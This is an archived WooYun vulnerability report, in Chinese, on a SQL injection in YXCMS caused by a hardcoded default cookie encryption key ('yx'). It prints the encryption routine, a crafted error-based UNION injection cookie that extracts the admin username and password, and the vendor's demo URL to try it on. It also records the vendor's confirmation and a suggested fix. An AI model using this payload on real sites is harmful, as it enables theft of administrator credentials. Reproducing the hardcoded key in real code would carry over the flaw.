{"id": 53400, "wybug_id": "wooyun-2014-067790", "wybug_title": "YXCMS最新版某机制处理不当导致的sql注入", "wybug_corp": "yxcms.net", "wybug_author": "roker", "wybug_date": "2014-07-18 13:44", "wybug_open_date": "2014-10-16 13:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-18：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-07-21：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-11：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-21：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-01：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-16：\t细节向公众公开  简要描述： 看到yxcms在乌云上也爆过很多洞了。是否考虑下注册成为厂商呢 :） 详细说明：  Yxcms是一款高效,灵活,实用,免费的企业建站系统,基于PHP和mysql技术,让您拥有更加专业的企业建站和企业网站制作服务。。测试的版本为 7.7号最新版。\nfunction cp_encode($data,$key='',$expire = 0){\t$string=serialize($data);\techo \"\\r\\n\".$string.\"\\r\\n\";\t$ckey_length = 4;\t$key = md5($key);\t$keya = md5(substr($key, 0, 16));\t$keyb = md5(substr($key, 16, 16));\t$keyc = substr(md5(microtime()), -$ckey_length);\t$cryptkey = $keya.md5($keya.$keyc);\t$key_length = strlen($cryptkey);\techo $key_length;\t$string =  sprintf('%010d', $expire ? $expire + time() : 0).substr(md5($string.$keyb), 0, 16).$string;\t$string_length = strlen($string);\t$result = '';\t$box = range(0, 255);\t$rndkey = array();\tfor($i = 0; $i <= 255; $i++) \t{\t\t$rndkey[$i] = ord($cryptkey[$i % $key_length]);\t}\tfor($j = $i = 0; $i < 256; $i++) \t{\t\t$j = ($j + $box[$i] + $rndkey[$i]) % 256;\t\t$tmp = $box[$i];\t\t$box[$i] = $box[$j];\t\t$box[$j] = $tmp;\t}\tfor($a = $j = $i = 0; $i < $string_length; $i++) \t{\t\t$a = ($a + 1) % 256;\t\t$j = ($j + $box[$a]) % 256;\t\t$tmp = $box[$a];\t\t$box[$a] = $box[$j];\t\t$box[$j] = $tmp;\t\t$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));\t}\treturn $keyc.str_replace('=', '', base64_encode($result));\t\t}\n其中 用户的cookie采用上述 函数加密。这不是dz的么。。。得不到密钥的话 是很难破解的，难而，yxcms在安装时，其密钥 会默认设置成为 ‘yx’。看到/protected/apps/member/memberApi.php\npublic function powerCheck(){//参数一：返回1没有权限，返回2未登陆有权限，返回数组登陆有权限\t\t $cookie_auth=get_cookie('auth');     if(empty($cookie_auth)) $group_id=1;//未登录组     else{        $memberinfo=explode('\\t',$cookie_auth);         $auth['id']=$memberinfo[0];        $auth['groupid']=$memberinfo[1];        $auth['account']=$memberinfo[2];        $auth['nickname']=empty($memberinfo[3])?'未知':$memberinfo[3];        $auth['lastip']=$memberinfo[4];        $auth['headpic']=$memberinfo[5];        $group_id=$auth['groupid'];     }      $notallow=model('memberGroup')->find(\"id={$group_id}\");\n我们构造一个恶意的cookie\n1\\\\t2 UNION SELECT 1,2,3 FROM (SELECT count(1),concat(round(rand(0)),(SELECT concat(username,0x23,password) FROM yx_admin LIMIT 0,1))a FROM information_schema.tables GROUP by a)b#\\\\taaaaaa\\\\ta\\\\\n利用它自带的加密函数对其加密\nfunction cp_encode($data,$key='',$expire = 0){\t$string=serialize($data);\techo \"\\r\\n\".$string.\"\\r\\n\";\t$ckey_length = 4;\t$key = md5($key);\t$keya = md5(substr($key, 0, 16));\t$keyb = md5(substr($key, 16, 16));\t$keyc = substr(md5(microtime()), -$ckey_length);\t$cryptkey = $keya.md5($keya.$keyc);\t$key_length = strlen($cryptkey);\techo $key_length;\t$string =  sprintf('%010d', $expire ? $expire + time() : 0).substr(md5($string.$keyb), 0, 16).$string;\t$string_length = strlen($string);\t$result = '';\t$box = range(0, 255);\t$rndkey = array();\tfor($i = 0; $i <= 255; $i++) \t{\t\t$rndkey[$i] = ord($cryptkey[$i % $key_length]);\t}\tfor($j = $i = 0; $i < 256; $i++) \t{\t\t$j = ($j + $box[$i] + $rndkey[$i]) % 256;\t\t$tmp = $box[$i];\t\t$box[$i] = $box[$j];\t\t$box[$j] = $tmp;\t}\tfor($a = $j = $i = 0; $i < $string_length; $i++) \t{\t\t$a = ($a + 1) % 256;\t\t$j = ($j + $box[$a]) % 256;\t\t$tmp = $box[$a];\t\t$box[$a] = $box[$j];\t\t$box[$j] = $tmp;\t\t$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));\t}\treturn $keyc.str_replace('=', '', base64_encode($result));\t\t}echo cp_encode(\"1\\\\t2 UNION SELECT 1,2,3 FROM (SELECT count(1),concat(round(rand(0)),(SELECT concat(username,0x23,password) FROM yx_admin LIMIT 0,1))a FROM information_schema.tables GROUP by a)b#\\\\taaaaaa\\\\ta\\\\\",\"yx\");\n官网测试下吧~访问http://demo.yxcms.net/index.php?r=member/index/cookie修改为我们刚才echo的值。\n\n   漏洞证明：  \n\n   修复方案：  安装时 随机生成key   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-07-18 16:45 厂商回复： 不错 注意了细节 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-08-12 12:41 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  厂商回复略吊    \n     2014-08-28 23:00 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  貌似很久以前看到过    \n     2014-08-28 23:35 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  @牛肉包子 是么?    \n     2014-08-29 21:51 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  @roker 你猜    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}